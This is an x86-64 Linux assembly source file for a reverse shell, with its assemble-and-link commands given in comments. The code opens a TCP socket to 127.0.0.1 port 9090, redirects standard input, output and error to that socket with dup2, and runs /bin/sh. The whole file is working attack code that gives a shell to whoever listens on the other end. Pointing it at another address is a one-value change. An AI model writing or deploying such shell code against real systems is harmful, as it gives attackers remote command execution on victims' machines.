; Author := { Somnath }

; Commands to assemble and link
; nasm -f elf64 main.asm -o main.o
; ld -m elf_x86_64 -e _start  main.o -o main

section .data
    binsh dd "/bin/sh", 0; Path to shell

section .text
global _start

init_socket:
    push rbp; Setting-up A Stack Frame
    mov rbp, rsp;
    sub rsp, 0x10; Reserving 16 bytes for struct sockaddr_in

    mov word[rsp+0x0], 0x2; AF_INET is 0x2 [2-bytes]
    mov word[rsp+0x2], 0x8223; PORT is 9090 (Big-endian order) [2-bytes]
    mov dword[rsp+0x4], 0x100007f; IP is 127.0.0.1 [4-bytes]
    mov qword[rsp+0x8], 0; Padding Bytes [8-bytes]

    mov rax, 0x29; socket() syscall
    mov rdi, 0x2; IP Protocol Family
    mov rsi, 0x1; TCP Socket Type
    mov rdx, 0x0; Protocol Type (auto)
    syscall; Register "rax" will have socket __fd 

    jmp connect;

connect:
    mov r8, rax; Saving socket __fd into r8 to preserve it
    mov rax, 0x2a; connect() syscall
    mov rdi, r8; rdi= int socket __fd
    lea rsi, [rsp+0x0]; rsi= const struct sockaddr *__addr
    mov rdx, 0x10; rdx= socklen_t __len
    syscall;

    mov rax, 0x21; dup2() syscall
    mov rdi, r8; rdi= int __fd
    mov rsi, 0; rsi= int __fd2
    syscall;

    mov rax, 0x21; dup2() syscall
    mov rdi, r8; rdi= int __fd
    mov rsi, 1; rsi= int __fd2
    syscall;

    mov rax, 0x21; dup2() syscall
    mov rdi, r8; rdi= int __fd
    mov rsi, 2; rsi= int __fd2
    syscall;

    xor rsi, rsi;
    xor rdx, rdx;

    jmp shell;

shell:
    mov rax, 0x3b; execve() syscall
    mov rdi, binsh; rdi= const char *filename
    syscall;

    jmp exit;
    
exit:
    mov rax, 0x3c; exit() syscall
    mov rdi, 0x0; rdi= int error_code
    syscall;

_start:
    jmp init_socket;
